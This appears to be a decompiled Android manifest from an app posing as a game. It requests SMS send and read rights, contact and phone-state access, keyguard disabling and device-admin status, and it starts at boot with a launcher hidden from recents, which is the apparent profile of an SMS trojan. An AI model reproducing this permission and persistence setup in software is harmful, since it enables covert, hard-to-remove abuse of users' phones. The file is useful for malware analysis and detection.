<manifest xmlns:android="http://schemas.android.com/apk/res/android" android:versionCode="13" android:versionName="2.1.3.19" package="com.games.cocos.ssaj" platformBuildVersionCode="19" platformBuildVersionName="4.4.2-1456859">
  <uses-sdk android:minSdkVersion="9"/>
  <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
  <uses-permission android:name="android.permission.WAKE_LOCK"/>
  <uses-permission android:name="android.permission.INTERNET"/>
  <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
  <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
  <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
  <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
  <uses-permission android:name="android.permission.RECEIVE_SMS"/>
  <uses-permission android:name="android.permission.READ_SMS"/>
  <uses-permission android:name="android.permission.WRITE_SMS"/>
  <uses-permission android:name="android.permission.SEND_SMS"/>
  <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
  <uses-permission android:name="android.permission.DISABLE_KEYGUARD"/>
  <uses-permission android:name="android.permission.READ_CONTACTS"/>
  <uses-permission android:name="android.permission.CHANGE_WIFI_STATE"/>
  <uses-permission android:name="android.permission.ACCESS_WIFI_STATE"/>
  <uses-permission android:name="android.permission.GET_TASKS"/>
  <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW"/>
  <uses-permission android:name="android.permission.RESTART_PACKAGES"/>
  <uses-permission android:name="android.permission.CHANGE_NETWORK_STATE"/>
  <application android:label="@7F050000" android:icon="@7F020000" android:allowClearUserData="false">
    <activity android:label="@7F050000" android:icon="@7F020000" android:name="com.andro.ofm.vpp.MyActivity" android:excludeFromRecents="true">
      <intent-filter>
        <action android:name="android.intent.action.MAIN"/>
        <category android:name="android.intent.category.LAUNCHER"/>
      </intent-filter>
    </activity>
    <service android:name="com.andro.ofm.vpp.MainService" android:enabled="true" android:exported="false">
      <intent-filter>
        <action android:name="com.android.action.start.msg.service"/>
      </intent-filter>
    </service>
    <receiver android:name="com.andro.ofm.vpp.BootReceiver">
      <intent-filter>
        <action android:name="android.intent.action.BOOT_COMPLETED"/>
        <action android:name="android.intent.action.USER_PRESENT"/>
        <category android:name="android.intent.category.DEFAULT"/>
      </intent-filter>
    </receiver>
    <receiver android:name="com.andro.ofm.vpp.MDAR" android:permission="android.permission.BIND_DEVICE_ADMIN">
      <meta-data android:name="android.app.device_admin" android:resource="@7F040000"/>
      <intent-filter>
        <action android:name="android.app.action.DEVICE_ADMIN_ENABLED"/>
      </intent-filter>
    </receiver>
  </application>
</manifest>
